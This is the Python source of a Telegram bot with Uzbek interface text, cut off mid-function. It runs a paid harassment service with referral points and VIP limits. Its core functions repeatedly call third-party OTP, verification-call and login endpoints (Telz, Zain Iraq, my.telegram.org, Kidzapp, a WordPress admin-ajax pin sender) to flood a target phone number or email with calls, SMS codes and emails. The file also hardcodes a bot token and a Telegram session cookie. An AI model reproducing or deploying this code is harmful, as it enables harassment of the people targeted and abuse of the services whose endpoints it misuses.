# ========== bot.py (Render uchun to'liq versiya - hech narsa kamaytirilmagan) ==========
import os
import sys
import time
import uuid
import random
import sqlite3
import json
import base64
import hashlib
import logging
import threading
import asyncio
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

import requests
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== Logging ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== Konfiguratsiya ==========
TOKEN = "8844906485:AAHxU1GSFLasIkieaJAr8xXsG72am0vZBWI"
PAYMENT_USERNAME = "vsf911"
OWNER_IDS = [8426582765]
MAX_WORKERS = 500

BUTTONS_STATUS = {
    "call": True,
    "spam_asia": True,
    "spam_ether": True,
    "spam_telegram": True,
    "spam_email": True,
    "referral": True
}

DEFAULT_LIMITS = {
    "call": 5,
    "spam_asia": 10,
    "spam_ether": 10,
    "spam_telegram": 5,
    "spam_email": 10
}

GREEN = "🟢"
RED = "🔴"

# ========== Flask ilovasi ==========
flask_app = Flask(__name__)

# ========== Ma'lumotlar bazasi ==========
db_lock = threading.RLock()
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

sent_calls = {}
call_lock = threading.Lock()

def init_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA synchronous=NORMAL")
        conn.execute("PRAGMA cache_size=10000")
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            is_vip INTEGER DEFAULT 0,
            vip_expiry TEXT,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            extra_tokens INTEGER DEFAULT 0,
            extra_tokens_expiry TEXT,
            points INTEGER DEFAULT 0,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS referral_links (
            user_id INTEGER PRIMARY KEY,
            link_code TEXT UNIQUE,
            total_clicks INTEGER DEFAULT 0,
            total_registered INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS user_daily_limits (
            user_id INTEGER,
            service TEXT,
            used_today INTEGER DEFAULT 0,
            last_reset TEXT,
            PRIMARY KEY (user_id, service)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS calls_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            call_time TEXT,
            status TEXT,
            response TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS spam_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            phone TEXT,
            service TEXT,
            count INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            spam_time TEXT,
            status TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS daily_stats (
            date TEXT PRIMARY KEY,
            total_calls INTEGER DEFAULT 0,
            total_spam INTEGER DEFAULT 0,
            unique_users INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS force_channels (
            channel_id TEXT PRIMARY KEY,
            channel_username TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )''')
        
        for service, limit in DEFAULT_LIMITS.items():
            c.execute(f"INSERT OR IGNORE INTO settings (key, value) VALUES ('limit_{service}', '{limit}')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('call_wait', '30')")
        c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('referral_points', '1')")
        
        conn.commit()
        conn.close()
        logger.info("✅ Ma'lumotlar bazasi tayyor")

def migrate_db():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_clicks INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE referral_links ADD COLUMN total_registered INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN extra_tokens_expiry TEXT')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN points INTEGER DEFAULT 0')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referrer_id INTEGER DEFAULT NULL')
        except:
            pass
        try:
            c.execute('ALTER TABLE users ADD COLUMN referral_count INTEGER DEFAULT 0')
        except:
            pass
        conn.commit()
        conn.close()
        logger.info("✅ Ma'lumotlar bazasi yangilandi")

init_db()
migrate_db()

# ========== Asosiy funksiyalar ==========
def generate_referral_code(user_id):
    code = hashlib.md5(f"{user_id}{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:10]
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO referral_links (user_id, link_code) VALUES (?, ?)', (user_id, code))
        conn.commit()
        conn.close()
    return code

def get_referral_code(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT link_code FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0]
    return generate_referral_code(user_id)

def get_user_points(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT points FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_count(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT referral_count FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r[0] if r and r[0] is not None else 0

def get_referral_stats(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT total_clicks, total_registered FROM referral_links WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r:
        return r[0] or 0, r[1] or 0
    return 0, 0

def update_referral_click(link_code):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE referral_links SET total_clicks = total_clicks + 1 WHERE link_code = ?', (link_code,))
        conn.commit()
        conn.close()

def update_user_points(user_id, points):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('UPDATE users SET points = points + ? WHERE user_id = ?', (points, user_id))
        conn.commit()
        conn.close()

def is_owner(user_id): 
    return user_id in OWNER_IDS

def is_admin(user_id):
    if user_id in OWNER_IDS: 
        return True
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    return r and r[0] == 1

def is_vip(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT is_vip, vip_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] == 1:
        if r[1]:
            try:
                expiry = datetime.strptime(r[1], '%Y-%m-%d')
                if expiry >= datetime.now(): 
                    return True
            except: 
                return True
        return True
    return False

def get_extra_tokens(user_id):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT extra_tokens, extra_tokens_expiry FROM users WHERE user_id = ?', (user_id,))
        r = c.fetchone()
        conn.close()
    if r and r[0] and r[1]:
        try:
            expiry = datetime.strptime(r[1], '%Y-%m-%d %H:%M:%S')
            if expiry >= datetime.now(): 
                return r[0]
        except: 
            pass
    return 0

def get_service_limit(user_id, service):
    if is_vip(user_id): 
        return 999999
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute(f'SELECT value FROM settings WHERE key = "limit_{service}"')
        r = c.fetchone()
        conn.close()
    free_limit = int(r[0]) if r else DEFAULT_LIMITS.get(service, 5)
    extra = get_extra_tokens(user_id)
    return free_limit + extra

def get_used_today(user_id, service):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT used_today, last_reset FROM user_daily_limits WHERE user_id = ? AND service = ?', (user_id, service))
        r = c.fetchone()
        conn.close()
    today = datetime.now().strftime('%Y-%m-%d')
    if r and r[1] == today: 
        return r[0]
    return 0

def increment_used(user_id, service, count=1):
    today = datetime.now().strftime('%Y-%m-%d')
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('''INSERT INTO user_daily_limits (user_id, service, used_today, last_reset) 
                     VALUES (?, ?, ?, ?) ON CONFLICT(user_id, service) DO UPDATE SET 
                     used_today = used_today + ?, last_reset = ?''',
                  (user_id, service, count, today, count, today))
        conn.commit()
        conn.close()

def can_use_service(user_id, service):
    used = get_used_today(user_id, service)
    limit = get_service_limit(user_id, service)
    return used < limit, limit - used

def add_call_log(user_id, phone, status, response=""):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO calls_log (user_id, phone, call_time, status, response) VALUES (?, ?, ?, ?, ?)',
                 (user_id, phone, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status, str(response)[:500]))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_calls = total_calls + 1 WHERE date = ?', (today,))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 1, 0, 0)', (today,))
        conn.commit()
        conn.close()

def add_spam_log(user_id, phone, service, count, success_count, fail_count, status):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT INTO spam_log (user_id, phone, service, count, success_count, fail_count, spam_time, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                 (user_id, phone, service, count, success_count, fail_count, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), status))
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE daily_stats SET total_spam = total_spam + ? WHERE date = ?', (count, today))
        if c.rowcount == 0:
            c.execute('INSERT INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, ?, 0)', (today, count))
        conn.commit()
        conn.close()

def reset_daily_limits():
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        today = datetime.now().strftime('%Y-%m-%d')
        c.execute('UPDATE user_daily_limits SET used_today = 0, last_reset = ? WHERE last_reset != ?', (today, today))
        conn.commit()
        conn.close()

async def check_channel(user_id, context):
    with db_lock:
        conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
        c = conn.cursor()
        c.execute('SELECT channel_username FROM force_channels')
        channels = c.fetchall()
        conn.close()
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{ch[0]}", user_id=user_id)
            if member.status in ['left', 'kicked']: 
                return False, ch[0]
        except: 
            continue
    return True, None

# ========== Telz ulanishi ==========
def telz_call_real(phone):
    android_id = uuid.uuid4().hex[:16]
    uid = str(uuid.uuid4())
    
    headers = {
        "User-Agent": "Telz-Android/17.5.48",
        "Content-Type": "application/json; charset=UTF-8"
    }
    
    try:
        requests.post("https://api.telz.com/app/auth_list", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "auth_list",
            "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/run", json={
            "android_id": android_id, "app_version": "17.5.48", "device_name": "",
            "event": "run", "ipv4_address": "", "lang": "ar",
            "network_country": "iq", "network_type": "WIFI", "os": "android",
            "os_version": "15", "push_token": "", "roaming": "no", "root": "no",
            "run_id": str(int(time.time())), "sim_country": "iq",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        requests.post("https://api.telz.com/app/validate_phonenumber", json={
            "android_id": android_id, "app_version": "17.5.48", "event": "validate_phonenumber",
            "os": "android", "os_version": "15", "phone": phone, "region": "IQ",
            "ts": int(time.time() * 1000), "uuid": uid
        }, headers=headers, timeout=5)
        
        time.sleep(0.5)
        
        r4 = requests.post("https://api.telz.com/app/auth_call", json={
            "android_id": android_id, "app_version": "17.5.48", "attempt": "0",
            "event": "auth_call", "lang": "ar", "os": "android", "os_version": "15",
            "phone": phone, "ts": int(time.time() * 1000), "uuid": uid,
            "run_id": str(int(time.time() * 1000))
        }, headers=headers, timeout=5)
        
        result = r4.json()
        
        if result.get('status') == 'ok':
            return True, "✅ Qo'ng'iroq muvaffaqiyatli yuborildi"
        elif result.get('reason') == '3.1':
            return False, "⚠️ Bu raqam allaqachon ro'yxatdan o'tgan"
        else:
            return False, "❌ Qo'ng'iroq yuborilmadi"
            
    except Exception as e:
        return False, f"❌ Xatolik: {str(e)[:30]}"

# ========== Spam xizmatlari ==========
def send_ether_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            url = "https://mw-mobileapp.iq.zain.com/api/otp/request"
            payload = {"msisdn": phone}
            headers = {'User-Agent': "okhttp/4.11.0", 'Content-Type': "application/json"}
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code in [200, 201, 202]:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_telegram_spam_real(phone, count):
    success, failed = 0, 0
    for i in range(min(count, 30)):
        try:
            cookies = {'stel_ln': 'ar', 'stel_acid': 'FrtmvJBwZdq7sey4JzSCm0bwhg97BgwnV5sFftSz09zwfRILdgH_sEVFAIp0KIpM'}
            data = {'phone': phone}
            r = requests.post('https://my.telegram.org/auth/send_password', cookies=cookies, data=data, timeout=5)
            if '"random_hash"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.15)
    return success, failed

def send_gmail_spam_real(email, count):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        try:
            json_data = {'email': email, 'sdk': 'web', 'platform': 'desktop'}
            r = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', json=json_data, timeout=5)
            if '"EMAIL SENT"' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

def send_asia_spam_real(phone, count, message):
    success, failed = 0, 0
    name = base64.b64decode('2ZjZrNmA').decode()
    for i in range(min(count, 100)):
        try:
            data = {
                'action': 'send_pin_code', 'msisdn': phone, 'appId': '3',
                'packageName': name + message, 'paymentMethodId': '3'
            }
            r = requests.post('https://pashacards.net/wp-admin/admin-ajax.php', data=data, timeout=5)
            if '"success":true' in r.text:
                success += 1
            else:
                failed += 1
        except:
            failed += 1
        time.sleep(0.1)
    return success, failed

async def make_call(phone, user_id):
    loop = asyncio.get_event_loop()
    success, message = await loop.run_in_executor(executor, telz_call_real, phone)
    add_call_log(user_id, phone, 'muvaffaqiyatli' if success else 'muvaffaqiyatsiz', message)
    return success, message

# ========== Asosiy menyu ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        args = context.args
        referrer_id = None
        if args and args[0].startswith('ref_'):
            code = args[0].replace('ref_', '')
            update_referral_click(code)
            with db_lock:
                conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
                c = conn.cursor()
                c.execute('SELECT user_id FROM referral_links WHERE link_code = ?', (code,))
                r = c.fetchone()
                if r:
                    referrer_id = r[0]
                conn.close()
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT * FROM users WHERE user_id = ?', (user.id,))
            existing = c.fetchone()
            if not existing:
                today = datetime.now().strftime('%Y-%m-%d')
                points_to_add = 1
                if referrer_id and referrer_id != user.id:
                    c.execute("INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count) VALUES (?, ?, ?, ?, ?, ?, 0)",
                             (user.id, user.username or "None", user.first_name, today, points_to_add, referrer_id))
                    c.execute('UPDATE users SET points = points + 1, referral_count = referral_count + 1 WHERE user_id = ?', (referrer_id,))
                    c.execute('UPDATE referral_links SET total_registered = total_registered + 1 WHERE user_id = ?', (referrer_id,))
                    conn.commit()
                    try:
                        await context.bot.send_message(referrer_id, "🎁 Yangi foydalanuvchi taklif qilindi!\n💎 1 ball qo'shildi")
                    except:
                        pass
                else:
                    c.execute("INSERT INTO users (user_id, username, first_name, join_date, points, referrer_id, referral_count) VALUES (?, ?, ?, ?, ?, ?, 0)",
                             (user.id, user.username or "None", user.first_name, today, points_to_add, None))
                
                c.execute('INSERT OR IGNORE INTO daily_stats (date, total_calls, total_spam, unique_users) VALUES (?, 0, 0, 0)', (today,))
                c.execute('UPDATE daily_stats SET unique_users = unique_users + 1 WHERE date = ?', (today,))
                
                for owner_id in OWNER_IDS:
                    try:
                        await context.bot.send_message(
                            owner_id,
                            f"👤 Yangi foydalanuvchi\n\n🆔 ID: {user.id}\n📛 Ism: {user.first_name}\n🏷️ Username: @{user.username if user.username else 'yoq'}\n📅 Sana: {today}\n💎 Ballar: {points_to_add}"
                        )
                    except:
                        pass
                conn.commit()
            conn.close()
        
        ok, ch = await check_channel(user.id, context)
        if not ok:
            keyboard = [[InlineKeyboardButton("📢 Kanaga a'zo bo'ling", url=f"https://t.me/{ch}")], [InlineKeyboardButton("✅ Tekshirish", callback_data="check_sub")]]
            await update.message.reply_text(f"⚠️ Majburiy a'zolik\n\nIltimos kanaga a'zo bo'ling:\n@{ch}", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        
        await show_main_menu(update.message, user.id, context)
    except Exception as e:
        logger.error(f"Startda xatolik: {e}")

async def show_main_menu(message, user_id, context):
    try:
        points = get_user_points(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        keyboard = [
            [InlineKeyboardButton(f"🎁 Ball yig'ish", callback_data="earn_points")],
            [InlineKeyboardButton(f"ℹ️ Hisobim haqida", callback_data="my_info")],
            [InlineKeyboardButton(f"🔄 Ball o'tkazish", callback_data="transfer_menu")],
            [InlineKeyboardButton(f"🛠️ Bot xizmatlari", callback_data="services_menu")],
            [InlineKeyboardButton(f"💰 Hisob balansi : {points} ball", callback_data="show_balance")],
            [InlineKeyboardButton(f"👑 VIP obuna", callback_data="vip_menu")],
        ]
        
        if is_admin(user_id):
            keyboard.append([InlineKeyboardButton(f"👨‍💼 Admin paneli", callback_data="admin_panel")])
        if is_owner(user_id):
            keyboard.append([InlineKeyboardButton(f"⚡ Egasi paneli", callback_data="owner_panel")])
        
        await message.reply_text(
            f"✦ • ───────────────── • ✦\n"
            f"🌟 *Bot xizmatlariga xush kelibsiz* 🌟\n"
            f"✦ • ───────────────── • ✦\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💰 Balansingiz : {points} ball\n"
            f"┃ ⭐ Ballarni qo'shimcha xizmatlarga ishlating\n"
            f"┃ 📞 Har kuni bepul urinishlar mavjud\n"
            f"┃ 🔗 Havolangiz tashriflari : {clicks} | Ro'yxatdan o'tganlar : {registered}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *O'zingizga mosini tanlang:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Asosiy menyuda xatolik: {e}")

# ========== Xizmatlar menyusi ==========
async def services_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()
        
        points = get_user_points(user_id)
        
        call_used = get_used_today(user_id, "call")
        call_limit = get_service_limit(user_id, "call")
        call_remaining = call_limit - call_used
        
        asia_used = get_used_today(user_id, "spam_asia")
        asia_limit = get_service_limit(user_id, "spam_asia")
        asia_remaining = asia_limit - asia_used
        
        ether_used = get_used_today(user_id, "spam_ether")
        ether_limit = get_service_limit(user_id, "spam_ether")
        ether_remaining = ether_limit - ether_used
        
        tg_used = get_used_today(user_id, "spam_telegram")
        tg_limit = get_service_limit(user_id, "spam_telegram")
        tg_remaining = tg_limit - tg_used
        
        email_used = get_used_today(user_id, "spam_email")
        email_limit = get_service_limit(user_id, "spam_email")
        email_remaining = email_limit - email_used
        
        keyboard = [
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['call'] else RED} 📞 Qo'ng'iroq (qolgan: {call_remaining})", callback_data="call_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_asia'] else RED} 🌏 Osiyo spami (qolgan: {asia_remaining})", callback_data="spam_asia_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_ether'] else RED} 🔥 Ether spami (qolgan: {ether_remaining})", callback_data="spam_ether_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_telegram'] else RED} 📱 Telegram spami (qolgan: {tg_remaining})", callback_data="spam_telegram_menu")],
            [InlineKeyboardButton(f"{GREEN if BUTTONS_STATUS['spam_email'] else RED} ✉️ Gmail spami (qolgan: {email_remaining})", callback_data="spam_email_menu")],
            [InlineKeyboardButton(f"💎 Ballarni almashtirish (1 ball = 1 qo'shimcha urinish)", callback_data="redeem_menu")],
            [InlineKeyboardButton(f"🔄 Ballarni xizmatga o'tkazish", callback_data="transfer_service_menu")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"◈ • ───────────────── • ◈\n"
            f"🛠️ *Bot xizmatlari* 🛠️\n"
            f"◈ • ───────────────── • ◈\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💎 Ballaringiz : {points} ball\n"
            f"┃ 📞 Bugungi bepul urinishlar :\n"
            f"┃    • Qo'ng'iroq: {call_used}/{call_limit}\n"
            f"┃    • Osiyo spami: {asia_used}/{asia_limit}\n"
            f"┃    • Ether spami: {ether_used}/{ether_limit}\n"
            f"┃    • Telegram spami: {tg_used}/{tg_limit}\n"
            f"┃    • Gmail spami: {email_used}/{email_limit}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📌 *Xizmatni tanlang:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Xizmatlar menyusida xatolik: {e}")

# ========== Qolgan funksiyalar ==========
async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]]
        await query.edit_message_text(
            f"💰 *Hisob balansingiz*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 💎 Balans : {points} ball\n"
            f"┃ ⭐ Har bir ball = 1 qo'shimcha xizmat urinishi\n"
            f"┃ 🎁 Do'stlarni taklif qilib ball yig'ing\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Balans ko'rsatishda xatolik: {e}")

async def earn_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not BUTTONS_STATUS.get("referral", True):
            query = update.callback_query
            await query.answer("🔴 Ball yig'ish xizmati ta'mirda!", show_alert=True)
            return
        
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        code = get_referral_code(user_id)
        bot_username = context.bot.username
        link = f"https://t.me/{bot_username}?start=ref_{code}"
        referrals = get_referral_count(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        keyboard = [
            [InlineKeyboardButton("🔗 Havolani ulashish", url=f"https://t.me/share/url?url={link}&text=🚀 Bu ajoyib botga qo'shiling!")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]
        ]
        
        await query.edit_message_text(
            f"🎁 *Ball yig'ish usuli*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ Taklif havolangizni ulashing\n"
            f"┃ 2️⃣ Har bir ro'yxatdan o'tgan odam 1 ball beradi\n"
            f"┃ 3️⃣ Ballarni qo'shimcha urinishlarga ishlating\n"
            f"┃\n"
            f"┃ 📊 Havolangiz statistikasi:\n"
            f"┃    • Tashriflar: {clicks}\n"
            f"┃    • Ro'yxatdan o'tganlar: {registered}\n"
            f"┃    • Botdagi taklif qilinganlar: {referrals}\n"
            f"┃\n"
            f"┃ 🔗 Havolangiz:\n"
            f"┃ `{link}`\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ball yig'ishda xatolik: {e}")

async def my_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        points = get_user_points(user_id)
        referrals = get_referral_count(user_id)
        clicks, registered = get_referral_stats(user_id)
        
        with db_lock:
            conn = sqlite3.connect('telz_bot.db', timeout=30, check_same_thread=False)
            c = conn.cursor()
            c.execute('SELECT join_date, first_name FROM users WHERE user_id = ?', (user_id,))
            u = c.fetchone()
            c.execute('SELECT COUNT(*) FROM calls_log WHERE user_id = ?', (user_id,))
            total_calls = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM spam_log WHERE user_id = ?', (user_id,))
            total_spam = c.fetchone()[0]
            conn.close()
        
        status = "VIP 👑" if is_vip(user_id) else "Oddiy 📱"
        call_used = get_used_today(user_id, "call")
        call_limit = get_service_limit(user_id, "call")
        call_free = call_limit - get_extra_tokens(user_id)
        
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]]
        
        await query.edit_message_text(
            f"ℹ️ *Hisobim haqida ma'lumot*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 👤 Holat : {status}\n"
            f"┃ 💎 Ballar : {points}\n"
            f"┃ 👥 Taklif qilinganlar : {referrals}\n"
            f"┃ 🔗 Havolangiz tashriflari : {clicks}\n"
            f"┃ 📝 Siz orqali ro'yxatdan o'tganlar : {registered}\n"
            f"┃ 📞 Jami qo'ng'iroqlar : {total_calls}\n"
            f"┃ 💣 Jami spam : {total_spam}\n"
            f"┃ 📅 Ro'yxatdan o'tgan sana : {u[0] if u else 'Nomalum'}\n"
            f"┃\n"
            f"┃ 📊 Bugungi urinishlar:\n"
            f"┃    • Qo'ng'iroq: {call_used}/{call_limit} (bepul: {call_free})\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Ma'lumot ko'rsatishda xatolik: {e}")

async def transfer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        keyboard = [
            [InlineKeyboardButton("🔄 Ballarni foydalanuvchiga o'tkazish", callback_data="transfer_points")],
            [InlineKeyboardButton("💎 Ballarni xizmatga o'tkazish", callback_data="transfer_service_menu")],
            [InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"🔄 *Ball o'tkazish tizimi*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ Foydalanuvchiga o'tkazish: Ballarni boshqa foydalanuvchiga yuborish\n"
            f"┃ 2️⃣ Xizmatga o'tkazish: Boshqa foydalanuvchi uchun qo'shimcha urinish sotib olish\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"O'tkazish menyusida xatolik: {e}")

async def transfer_points(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        context.user_data['transfer_step'] = 'waiting_id'
        keyboard = [[InlineKeyboardButton("🔙 Orqaga", callback_data="back_main")]]
        await query.edit_message_text(
            f"🔄 *Ballarni foydalanuvchiga o'tkazish*\n\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃ 1️⃣ O'tkazmoqchi bo'lgan foydalanuvchi ID sini yuboring\n"
            f"┃ 2️⃣ Keyin ballar sonini yuboring\n"
            f"┃\n"
            f"┃ ⚠️ Foydalanuvchi o'tkazmani qabul qilishi kerak\n"
            f"┃ ⚠️ O'tkazilgan ballar qaytarilmaydi\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"📝 *Foydalanuvchi ID sini yuboring:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
